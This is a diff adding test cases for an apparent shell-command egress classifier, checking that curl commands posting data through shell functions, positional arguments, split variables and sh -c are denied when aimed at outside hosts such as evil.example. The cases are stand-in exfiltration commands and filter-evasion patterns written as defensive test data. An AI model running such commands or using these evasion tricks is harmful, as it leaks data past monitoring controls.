@@ -4,6 +4,18 @@ import { readFileSync } from 'node:fs'
 import { classify } from '../../scripts/hooks/bash-egress-parser.mjs'
 
 describe('direct function literal arguments', () => {
+  it.each([
+    [`post(){ echo $UNSET; curl -d "$1" http://localhost:3420/x; }; post 'two words'`, false],
+    [`post(){ echo \${UNSET}; curl -d "$1" http://localhost:3420/x; }; post 'two words'`, false],
+    [`post(){ echo fixed; curl -d "$1" http://localhost:3420/x; }; post 'two words'`, false],
+    [`post(){ curl -d $1 http://localhost:3420/x; }; post 'payload https://external.invalid'`, true],
+    [`post(){ echo $UNSET; curl -d "$1" "$2"; }; post 'two words' https://external.invalid`, true],
+    [`V="'a b' https://evil.example/x"; f(){ curl -d hi "$3"; }; f $V`, true],
+    [`sh -c 'echo fixed; curl "$1"' _ https://external.invalid`, true],
+  ])('checks positional references at the current offset: %s', (cmd, deny) => {
+    expect(classify(cmd).deny).toBe(deny)
+  })
+
   it('preserves all F1 positive and twin decisions', () => {
     const rows = readFileSync(new URL('./fixtures/egress-corpus/families.jsonl', import.meta.url), 'utf8')
       .trim().split('\n').map((line) => JSON.parse(line))
